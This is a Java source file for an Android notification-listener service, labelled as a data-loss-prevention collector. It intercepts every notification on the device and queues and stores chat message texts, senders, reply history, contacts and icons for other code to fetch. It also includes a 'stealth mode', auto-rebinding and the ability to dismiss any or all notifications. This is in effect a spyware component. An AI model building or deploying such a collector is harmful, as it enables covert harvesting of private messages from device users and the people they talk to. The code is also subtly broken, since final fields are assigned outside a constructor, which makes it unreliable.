package com.athex.dlp.collectors;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * ATHEX DLP Enterprise - NotificationCollector
 * 
 * Advanced notification interception and mirroring module.
 * Extends NotificationListenerService to capture all notifications:
 * - Real-time notification capture
 * - Notification history
 * - App-specific filtering
 * - Content extraction (title, text, big text, messages)
 * - Notification actions
 * - Media notifications
 * - Messaging notifications
 * - Silent/stealth mode
 * 
 * @author ATHEX DLP Team
 * @version 2.0.0
 */
public class NotificationCollector extends NotificationListenerService {
    
    private static final String TAG = "ATHEX_NotificationCollector";
    
    // Singleton instance
    private static NotificationCollector instance;
    
    // Constants
    private static final int MAX_HISTORY_SIZE = 500;
    private static final int MAX_QUEUE_SIZE = 1000;
    
    // ============================================================
    // INSTANCE VARIABLES
    // ============================================================
    
    // Context and managers
    private NotificationManager notificationManager;
    private PackageManager packageManager;
    
    // Handlers
    private Handler mainHandler;
    private ExecutorService executor;
    
    // State
    private final AtomicBoolean isServiceRunning = new AtomicBoolean(false);
    private final AtomicInteger notificationCount = new AtomicInteger(0);
    private final AtomicBoolean stealthMode = new AtomicBoolean(false);
    
    // Collections
    private final ConcurrentLinkedQueue<JSONObject> notificationQueue;
    private final List<JSONObject> notificationHistory;
    private final List<String> filteredApps;
    private final List<String> keywordFilters;
    
    // Callbacks
    private NotificationCallback callback;
    private NotificationFilter filter;
    
    // Statistics
    private long serviceStartTime = 0;
    private long lastNotificationTime = 0;
    private final AtomicInteger totalCaptured = new AtomicInteger(0);
    private final AtomicInteger totalPosted = new AtomicInteger(0);
    private final AtomicInteger totalRemoved = new AtomicInteger(0);
    
    // ============================================================
    // INTERFACES
    // ============================================================
    
    public interface NotificationCallback {
        void onNotificationPosted(JSONObject notificationData);
        void onNotificationRemoved(String key, int reason);
        void onNotificationQueued(int queueSize);
        void onNotificationError(String error);
    }
    
    public interface NotificationFilter {
        boolean shouldCapture(StatusBarNotification sbn);
        boolean shouldQueue(JSONObject notificationData);
    }
    
    // ============================================================
    // LIFECYCLE
    // ============================================================
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        instance = this;
        Log.i(TAG, "========================================");
        Log.i(TAG, "NotificationCollector service created");
        Log.i(TAG, "========================================");
        
        // Initialize components
        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        packageManager = getPackageManager();
        mainHandler = new Handler(Looper.getMainLooper());
        executor = Executors.newSingleThreadExecutor();
        
        // Initialize collections
        notificationQueue = new ConcurrentLinkedQueue<>();
        notificationHistory = new ArrayList<>();
        filteredApps = new ArrayList<>();
        keywordFilters = new ArrayList<>();
        
        // Add default filtered apps (system apps to ignore)
        filteredApps.add("com.android.systemui");
        filteredApps.add("android");
        
        isServiceRunning.set(true);
        serviceStartTime = System.currentTimeMillis();
        
        Log.i(TAG, "Service initialized successfully");
    }
    
    @Override
    public void onDestroy() {
        Log.i(TAG, "NotificationCollector service destroying...");
        isServiceRunning.set(false);
        
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
        
        super.onDestroy();
    }
    
    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        Log.i(TAG, "Notification listener connected");
        
        // Request notification permissions if needed
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ might need additional setup
            Log.d(TAG, "Android 13+ notification listener active");
        }
    }
    
    @Override
    public void onListenerDisconnected() {
        Log.w(TAG, "Notification listener disconnected - attempting reconnect");
        super.onListenerDisconnected();
        
        // Request reconnection
        requestRebind(new android.content.ComponentName(this, NotificationCollector.class));
    }
    
    // ============================================================
    // NOTIFICATION EVENTS
    // ============================================================
    
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        
        try {
            // Skip if in stealth mode
            if (stealthMode.get()) return;
            
            // Apply filter
            if (filter != null && !filter.shouldCapture(sbn)) {
                return;
            }
            
            // Skip filtered apps
            String packageName = sbn.getPackageName();
            if (filteredApps.contains(packageName)) {
                return;
            }
            
            totalPosted.incrementAndGet();
            notificationCount.incrementAndGet();
            lastNotificationTime = System.currentTimeMillis();
            
            // Extract notification data (on background thread for heavy operations)
            executor.execute(() -> {
                try {
                    JSONObject notificationData = extractNotificationData(sbn);
                    
                    if (notificationData != null) {
                        // Apply keyword filter
                        if (!keywordFilters.isEmpty() && !matchesKeywordFilter(notificationData)) {
                            return;
                        }
                        
                        // Apply queue filter
                        if (filter != null && !filter.shouldQueue(notificationData)) {
                            // Send directly without queuing
                            notifyNotificationPosted(notificationData);
                            return;
                        }
                        
                        // Add to queue
                        notificationQueue.offer(notificationData);
                        totalCaptured.incrementAndGet();
                        
                        // Add to history
                        synchronized (notificationHistory) {
                            notificationHistory.add(notificationData);
                            
                            // Trim history
                            while (notificationHistory.size() > MAX_HISTORY_SIZE) {
                                notificationHistory.remove(0);
                            }
                        }
                        
                        // Trim queue
                        while (notificationQueue.size() > MAX_QUEUE_SIZE) {
                            notificationQueue.poll();
                        }
                        
                        // Notify
                        notifyNotificationPosted(notificationData);
                        notifyNotificationQueued(notificationQueue.size());
                    }
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error processing notification: " + e.getMessage());
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "Error in onNotificationPosted: " + e.getMessage(), e);
        }
    }
    
    @Override
    public void onNotificationRemoved(StatusBarNotification sbn, RankingMap rankingMap, int reason) {
        if (sbn == null) return;
        
        try {
            totalRemoved.incrementAndGet();
            notificationCount.decrementAndGet();
            
            String key = sbn.getKey();
            
            // Remove from history
            synchronized (notificationHistory) {
                notificationHistory.removeIf(n -> key.equals(n.optString("key")));
            }
            
            // Notify
            notifyNotificationRemoved(key, reason);
            
        } catch (Exception e) {
            Log.e(TAG, "Error in onNotificationRemoved: " + e.getMessage());
        }
    }
    
    @Override
    public void onNotificationRankingUpdate(RankingMap rankingMap) {
        // Can be used for ranking updates if needed
        Log.v(TAG, "Notification ranking updated");
    }
    
    // ============================================================
    // NOTIFICATION EXTRACTION
    // ============================================================
    
    /**
     * Extract comprehensive notification data
     */
    private JSONObject extractNotificationData(StatusBarNotification sbn) {
        try {
            JSONObject data = new JSONObject();
            
            // Basic info
            data.put("key", sbn.getKey());
            data.put("id", sbn.getId());
            data.put("package_name", sbn.getPackageName());
            data.put("post_time", sbn.getPostTime());
            data.put("post_time_formatted", formatTimestamp(sbn.getPostTime()));
            data.put("captured_time", System.currentTimeMillis());
            data.put("is_ongoing", sbn.isOngoing());
            data.put("is_clearable", sbn.isClearable());
            data.put("is_group", sbn.isGroup());
            
            if (sbn.getGroupKey() != null) {
                data.put("group_key", sbn.getGroupKey());
            }
            
            if (sbn.getTag() != null) {
                data.put("tag", sbn.getTag());
            }
            
            // User info
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                data.put("user_id", sbn.getUserId());
            }
            
            // App info
            try {
                ApplicationInfo appInfo = packageManager.getApplicationInfo(
                    sbn.getPackageName(), 0
                );
                String appName = packageManager.getApplicationLabel(appInfo).toString();
                data.put("app_name", appName);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    data.put("app_category", appInfo.category);
                }
            } catch (PackageManager.NameNotFoundException e) {
                data.put("app_name", sbn.getPackageName());
            }
            
            // Notification object
            Notification notification = sbn.getNotification();
            if (notification != null) {
                data.put("notification_priority", notification.priority);
                data.put("notification_category", notification.category != null ? 
                    notification.category : "");
                data.put("notification_visibility", notification.visibility);
                data.put("notification_color", notification.color);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    data.put("notification_channel_id", notification.getChannelId());
                    data.put("notification_timeout", notification.getTimeoutAfter());
                }
                
                if (notification.flags != 0) {
                    JSONObject flags = new JSONObject();
                    flags.put("FLAG_INSISTENT", (notification.flags & Notification.FLAG_INSISTENT) != 0);
                    flags.put("FLAG_NO_CLEAR", (notification.flags & Notification.FLAG_NO_CLEAR) != 0);
                    flags.put("FLAG_ONGOING_EVENT", (notification.flags & Notification.FLAG_ONGOING_EVENT) != 0);
                    flags.put("FLAG_ONLY_ALERT_ONCE", (notification.flags & Notification.FLAG_ONLY_ALERT_ONCE) != 0);
                    flags.put("FLAG_AUTO_CANCEL", (notification.flags & Notification.FLAG_AUTO_CANCEL) != 0);
                    flags.put("FLAG_LOCAL_ONLY", (notification.flags & Notification.FLAG_LOCAL_ONLY) != 0);
                    flags.put("FLAG_GROUP_SUMMARY", (notification.flags & Notification.FLAG_GROUP_SUMMARY) != 0);
                    data.put("flags", flags);
                }
            }
            
            // Extract extras (content)
            Bundle extras = notification != null ? notification.extras : null;
            if (extras != null) {
                JSONObject content = extractNotificationContent(extras);
                if (content.length() > 0) {
                    data.put("content", content);
                }
            }
            
            // Extract actions
            if (notification != null && notification.actions != null) {
                JSONArray actions = extractNotificationActions(notification.actions);
                if (actions.length() > 0) {
                    data.put("actions", actions);
                }
            }
            
            // Extract large icon
            if (notification != null && notification.getLargeIcon() != null) {
                try {
                    String iconBase64 = bitmapToBase64(notification.getLargeIcon());
                    if (iconBase64 != null) {
                        data.put("large_icon", iconBase64);
                    }
                } catch (Exception e) {
                    Log.w(TAG, "Failed to extract large icon: " + e.getMessage());
                }
            }
            
            // Messaging style (for chat apps)
            if (notification != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                JSONArray messages = extractMessagingMessages(notification);
                if (messages != null && messages.length() > 0) {
                    data.put("messages", messages);
                    data.put("notification_style", "messaging");
                }
            }
            
            // Media style (for music apps)
            if (notification != null && notification.extras != null) {
                if (extras.containsKey(Notification.EXTRA_MEDIA_SESSION)) {
                    JSONObject mediaInfo = extractMediaInfo(extras);
                    if (mediaInfo != null) {
                        data.put("media", mediaInfo);
                        data.put("notification_style", "media");
                    }
                }
            }
            
            return data;
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting notification data: " + e.getMessage(), e);
            return null;
        }
    }
    
    /**
     * Extract notification content from extras
     */
    private JSONObject extractNotificationContent(Bundle extras) {
        JSONObject content = new JSONObject();
        
        try {
            // Title
            CharSequence title = extras.getCharSequence(Notification.EXTRA_TITLE);
            if (title != null) {
                content.put("title", title.toString());
            }
            
            // Text
            CharSequence text = extras.getCharSequence(Notification.EXTRA_TEXT);
            if (text != null) {
                content.put("text", text.toString());
            }
            
            // Big text
            CharSequence bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT);
            if (bigText != null) {
                content.put("big_text", bigText.toString());
            }
            
            // Sub text
            CharSequence subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
            if (subText != null) {
                content.put("sub_text", subText.toString());
            }
            
            // Summary text
            CharSequence summaryText = extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT);
            if (summaryText != null) {
                content.put("summary_text", summaryText.toString());
            }
            
            // Info text
            CharSequence infoText = extras.getCharSequence(Notification.EXTRA_INFO_TEXT);
            if (infoText != null) {
                content.put("info_text", infoText.toString());
            }
            
            // Progress
            if (extras.containsKey(Notification.EXTRA_PROGRESS)) {
                int progress = extras.getInt(Notification.EXTRA_PROGRESS);
                int progressMax = extras.getInt(Notification.EXTRA_PROGRESS_MAX, 100);
                boolean progressIndeterminate = extras.getBoolean(
                    Notification.EXTRA_PROGRESS_INDETERMINATE, false
                );
                
                JSONObject progressObj = new JSONObject();
                progressObj.put("current", progress);
                progressObj.put("max", progressMax);
                progressObj.put("percent", progressMax > 0 ? (progress * 100 / progressMax) : 0);
                progressObj.put("indeterminate", progressIndeterminate);
                content.put("progress", progressObj);
            }
            
            // Remote input history (for replies)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                Parcelable[] remoteInputs = extras.getParcelableArray(
                    Notification.EXTRA_REMOTE_INPUT_HISTORY
                );
                if (remoteInputs != null && remoteInputs.length > 0) {
                    JSONArray history = new JSONArray();
                    for (Parcelable p : remoteInputs) {
                        if (p instanceof Bundle) {
                            Bundle inputBundle = (Bundle) p;
                            String inputText = inputBundle.getString("text");
                            if (inputText != null) {
                                history.put(inputText);
                            }
                        }
                    }
                    if (history.length() > 0) {
                        content.put("remote_input_history", history);
                    }
                }
            }
            
            // People/contacts
            String[] people = extras.getStringArray(Notification.EXTRA_PEOPLE_LIST);
            if (people != null && people.length > 0) {
                JSONArray peopleArray = new JSONArray();
                for (String person : people) {
                    peopleArray.put(person);
                }
                content.put("people", peopleArray);
            }
            
            // Template
            String template = extras.getString(Notification.EXTRA_TEMPLATE);
            if (template != null) {
                content.put("template", template);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting notification content: " + e.getMessage());
        }
        
        return content;
    }
    
    /**
     * Extract notification actions
     */
    private JSONArray extractNotificationActions(Notification.Action[] actions) {
        JSONArray actionsArray = new JSONArray();
        
        try {
            for (Notification.Action action : actions) {
                JSONObject actionObj = new JSONObject();
                
                if (action.title != null) {
                    actionObj.put("title", action.title.toString());
                }
                
                if (action.actionIntent != null) {
                    actionObj.put("has_intent", true);
                }
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    if (action.getRemoteInputs() != null) {
                        JSONArray remoteInputs = new JSONArray();
                        for (android.app.RemoteInput ri : action.getRemoteInputs()) {
                            JSONObject riObj = new JSONObject();
                            riObj.put("label", ri.getLabel() != null ? ri.getLabel().toString() : "");
                            riObj.put("allow_free_form", ri.getAllowFreeFormInput());
                            remoteInputs.put(riObj);
                        }
                        actionObj.put("remote_inputs", remoteInputs);
                    }
                }
                
                actionObj.put("is_contextual", action.isContextual());
                
                actionsArray.put(actionObj);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting actions: " + e.getMessage());
        }
        
        return actionsArray;
    }
    
    /**
     * Extract messaging style messages
     */
    private JSONArray extractMessagingMessages(Notification notification) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return null;
        
        try {
            // Use reflection to access MessagingStyle messages
            if (notification.extras != null) {
                Parcelable[] messages = notification.extras.getParcelableArray(
                    Notification.EXTRA_MESSAGES
                );
                
                if (messages != null) {
                    JSONArray messagesArray = new JSONArray();
                    
                    for (Parcelable message : messages) {
                        // MessagingStyle.Message has sender, text, timestamp
                        Bundle messageBundle = (Bundle) message;
                        JSONObject msgObj = new JSONObject();
                        
                        CharSequence sender = messageBundle.getCharSequence("sender");
                        if (sender != null) {
                            msgObj.put("sender", sender.toString());
                        }
                        
                        CharSequence msgText = messageBundle.getCharSequence("text");
                        if (msgText != null) {
                            msgObj.put("text", msgText.toString());
                        }
                        
                        long timestamp = messageBundle.getLong("time");
                        if (timestamp > 0) {
                            msgObj.put("timestamp", timestamp);
                            msgObj.put("time_formatted", formatTimestamp(timestamp));
                        }
                        
                        messagesArray.put(msgObj);
                    }
                    
                    return messagesArray;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error extracting messages: " + e.getMessage());
        }
        
        return null;
    }
    
    /**
     * Extract media notification info
     */
    private JSONObject extractMediaInfo(Bundle extras) {
        try {
            JSONObject mediaInfo = new JSONObject();
            
            CharSequence artist = extras.getCharSequence(Notification.EXTRA_MEDIA_ARTIST);
            if (artist != null) mediaInfo.put("artist", artist.toString());
            
            CharSequence album = extras.getCharSequence(Notification.EXTRA_MEDIA_ALBUM);
            if (album != null) mediaInfo.put("album", album.toString());
            
            CharSequence title = extras.getCharSequence(Notification.EXTRA_MEDIA_TITLE);
            if (title != null) mediaInfo.put("title", title.toString());
            
            if (mediaInfo.length() > 0) return mediaInfo;
            
        } catch (Exception e) {
            Log.e(TAG, "Error extracting media info: " + e.getMessage());
        }
        
        return null;
    }
    
    // ============================================================
    // UTILITY METHODS
    // ============================================================
    
    private String bitmapToBase64(Bitmap bitmap) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 80, baos);
            byte[] bytes = baos.toByteArray();
            baos.close();
            return Base64.encodeToString(bytes, Base64.NO_WRAP);
        } catch (Exception e) {
            return null;
        }
    }
    
    private boolean matchesKeywordFilter(JSONObject notificationData) {
        try {
            JSONObject content = notificationData.optJSONObject("content");
            if (content == null) return false;
            
            String title = content.optString("title", "").toLowerCase();
            String text = content.optString("text", "").toLowerCase();
            String combined = title + " " + text;
            
            for (String keyword : keywordFilters) {
                if (combined.contains(keyword.toLowerCase())) {
                    return true;
                }
            }
            
            return keywordFilters.isEmpty(); // Pass if no filters set
            
        } catch (Exception e) {
            return true;
        }
    }
    
    private String formatTimestamp(long timestamp) {
        try {
            return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(new Date(timestamp));
        } catch (Exception e) {
            return String.valueOf(timestamp);
        }
    }
    
    // ============================================================
    // PUBLIC API
    // ============================================================
    
    public static NotificationCollector getInstance() {
        return instance;
    }
    
    public void setCallback(NotificationCallback callback) {
        this.callback = callback;
    }
    
    public void setFilter(NotificationFilter filter) {
        this.filter = filter;
    }
    
    public void setStealthMode(boolean stealth) {
        this.stealthMode.set(stealth);
        Log.d(TAG, "Stealth mode: " + (stealth ? "ON" : "OFF"));
    }
    
    public void addFilteredApp(String packageName) {
        if (!filteredApps.contains(packageName)) {
            filteredApps.add(packageName);
        }
    }
    
    public void removeFilteredApp(String packageName) {
        filteredApps.remove(packageName);
    }
    
    public void addKeywordFilter(String keyword) {
        if (!keywordFilters.contains(keyword.toLowerCase())) {
            keywordFilters.add(keyword.toLowerCase());
        }
    }
    
    public void clearKeywordFilters() {
        keywordFilters.clear();
    }
    
    /**
     * Get pending notifications from queue
     */
    public JSONArray getPendingNotifications(int maxCount) {
        JSONArray notifications = new JSONArray();
        int count = 0;
        
        for (JSONObject notification : notificationQueue) {
            if (count >= maxCount) break;
            notifications.put(notification);
            count++;
        }
        
        return notifications;
    }
    
    /**
     * Drain and return all queued notifications
     */
    public JSONArray drainQueue() {
        JSONArray notifications = new JSONArray();
        
        JSONObject notification;
        while ((notification = notificationQueue.poll()) != null) {
            notifications.put(notification);
        }
        
        return notifications;
    }
    
    /**
     * Get notification history
     */
    public JSONArray getHistory(int maxCount) {
        JSONArray history = new JSONArray();
        
        synchronized (notificationHistory) {
            int start = Math.max(0, notificationHistory.size() - maxCount);
            for (int i = start; i < notificationHistory.size(); i++) {
                history.put(notificationHistory.get(i));
            }
        }
        
        return history;
    }
    
    /**
     * Clear notification history
     */
    public void clearHistory() {
        synchronized (notificationHistory) {
            notificationHistory.clear();
        }
    }
    
    /**
     * Get active notifications from system
     */
    public JSONArray getActiveNotifications() {
        JSONArray activeNotifications = new JSONArray();
        
        try {
            StatusBarNotification[] activeNotifs = getActiveNotifications();
            
            if (activeNotifs != null) {
                for (StatusBarNotification sbn : activeNotifs) {
                    JSONObject data = extractNotificationData(sbn);
                    if (data != null) {
                        activeNotifications.put(data);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting active notifications: " + e.getMessage());
        }
        
        return activeNotifications;
    }
    
    /**
     * Dismiss a notification
     */
    public void dismissNotification(String key) {
        try {
            cancelNotification(key);
            Log.d(TAG, "Notification dismissed: " + key);
        } catch (Exception e) {
            Log.e(TAG, "Error dismissing notification: " + e.getMessage());
        }
    }
    
    /**
     * Dismiss all notifications
     */
    public void dismissAllNotifications() {
        try {
            cancelAllNotifications();
            Log.d(TAG, "All notifications dismissed");
        } catch (Exception e) {
            Log.e(TAG, "Error dismissing all notifications: " + e.getMessage());
        }
    }
    
    // ============================================================
    // STATISTICS
    // ============================================================
    
    public int getQueueSize() {
        return notificationQueue.size();
    }
    
    public int getHistorySize() {
        synchronized (notificationHistory) {
            return notificationHistory.size();
        }
    }
    
    public int getTotalCaptured() {
        return totalCaptured.get();
    }
    
    public int getTotalPosted() {
        return totalPosted.get();
    }
    
    public int getTotalRemoved() {
        return totalRemoved.get();
    }
    
    public long getUptime() {
        return System.currentTimeMillis() - serviceStartTime;
    }
    
    public JSONObject getStatistics() {
        JSONObject stats = new JSONObject();
        try {
            stats.put("service_running", isServiceRunning.get());
            stats.put("stealth_mode", stealthMode.get());
            stats.put("queue_size", getQueueSize());
            stats.put("history_size", getHistorySize());
            stats.put("total_posted", totalPosted.get());
            stats.put("total_removed", totalRemoved.get());
            stats.put("total_captured", totalCaptured.get());
            stats.put("filtered_apps_count", filteredApps.size());
            stats.put("keyword_filters_count", keywordFilters.size());
            stats.put("uptime_seconds", getUptime() / 1000);
            stats.put("last_notification_time", lastNotificationTime);
        } catch (Exception e) {
            Log.e(TAG, "Error building statistics: " + e.getMessage());
        }
        return stats;
    }
    
    // ============================================================
    // CALLBACK NOTIFIERS
    // ============================================================
    
    private void notifyNotificationPosted(JSONObject data) {
        if (callback != null) {
            mainHandler.post(() -> callback.onNotificationPosted(data));
        }
    }
    
    private void notifyNotificationRemoved(String key, int reason) {
        if (callback != null) {
            mainHandler.post(() -> callback.onNotificationRemoved(key, reason));
        }
    }
    
    private void notifyNotificationQueued(int queueSize) {
        if (callback != null) {
            mainHandler.post(() -> callback.onNotificationQueued(queueSize));
        }
    }
}